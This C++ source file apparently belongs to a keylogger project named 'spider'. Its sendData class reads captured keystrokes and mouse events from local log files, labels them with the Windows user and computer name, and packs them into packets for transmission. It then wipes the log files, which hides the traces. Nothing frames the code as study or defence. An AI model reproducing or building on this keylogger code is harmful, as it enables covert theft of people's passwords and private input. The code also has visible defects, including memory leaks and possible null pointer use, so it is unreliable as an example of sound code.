#include "sendData.h"
#include "spider.h"
#include <string.h>


sendData::sendData()
{
}


sendData::~sendData()
{
}

int		sendData::sendKey()
{
	std::string line;
	std::fstream ofs;
	int i;
	int y;

	i = 0;
	y = 0;
	std::lock_guard <std::mutex> lock(myMutex);
	std::ifstream infile("keylogs.txt");
	if (std::getline(infile, line))
	{
		keyboard = new t_paquet;
		keyboard->opcode = 0x04;
		TCHAR infoBuf[SHRT_MAX];
		DWORD bufcharCount = SHRT_MAX;
		GetUserName(infoBuf, &bufcharCount);
		while (infoBuf[i] != 0 && i < 49)
			keyboard->name[y++] = infoBuf[i++];	
		keyboard->name[y++] = '@';
		GetComputerName(infoBuf, &bufcharCount);
		i = 0;
		while (infoBuf[i] != 0 && i < 49)
			keyboard->name[y++] = infoBuf[i++];
		keyboard->name[y++] = 0;
		fillStruct(line);
	}
	else
		return(SPIDER_ERR);
	infile.close();
	ofs.open("keylogs.txt", std::ios::out | std::ios::trunc);
	ofs.close();
	return (SPIDER_OK);
}

int		sendData::sendMouse()
{
	std::string line;
	std::fstream ofs;
	int i;
	int y;

	i = 0;
	y = 0;
	std::lock_guard <std::mutex> lock(myMutex);
	std::ifstream infile("mouselogs.txt");
	if (std::getline(infile, line))
	{
		this->mouse = new t_paquet;
		this->mouse->opcode = 0x05;
		TCHAR infoBuf[SHRT_MAX];
		DWORD bufcharCount = SHRT_MAX;
		GetUserName(infoBuf, &bufcharCount);
		while (infoBuf[i] != 0 && i < 49)
			mouse->name[y++] = infoBuf[i++];
		mouse->name[y++] = '@';
		GetComputerName(infoBuf, &bufcharCount);
		i = 0;
		while (infoBuf[i] != 0 && i < 49)
			mouse->name[y++] = infoBuf[i++];
		mouse->name[y++] = 0;
		fillStruct(line);
	}
	else
		return (SPIDER_ERR);
	infile.close();
	ofs.open("mouselogs.txt", std::ios::out | std::ios::trunc);
	ofs.close();
	return (SPIDER_OK);
}

int		sendData::fillStruct(std::string line)
{
	std::istringstream token1(line);
	int		type = 0;

	std::cout << "line -> " << line << std::endl;
	token1 >> type;
	if (type == KEYBOARD_DATA)
	{
		token1 >> this->keyboard->timestamp;
		std::string delimiter = " ";

		size_t pos = 0;
		std::string token;
		while ((pos = line.find(delimiter)) != std::string::npos)
		{
			token = line.substr(0, pos);
			line.erase(0, pos + delimiter.length());
		}
		int i;
		int y;

		i = 0;
		y = 0;
		while (line[i] != '\0')
			this->keyboard->k[y++] = line[i++];
		this->keyboard->k[y] = '\0';
		this->keyboard->key_code = line.at(0);

	}
	else if (type == MOUSE_DATA)
	{
		std::cout << "line = " << line << std::endl;
		token1 >> this->mouse->timestamp;
		token1 >> this->mouse->key_code;
		token1 >> this->mouse->x;
		token1 >> this->mouse->y;
	}
	return (SPIDER_OK);
}

void			sendData::printData(int type)
{
	if (type == KEYBOARD_DATA)
		 std::cout << keyboard->timestamp << " [KEYBOARD] opcode :" << keyboard->opcode << " | k :" << keyboard->k << std::endl;
	else if (type == MOUSE_DATA)
		std::cout <<  mouse->timestamp << " [MOUSE] opcode :" << mouse->opcode << " | keycode :" << mouse->key_code << " | x:" << mouse->x << " y:" << mouse->y << std::endl;
}

t_paquet*		sendData::getKeyData() const
{
	return (this->keyboard);
}

t_paquet*		sendData::getMouseData() const
{
	return (this->mouse);
}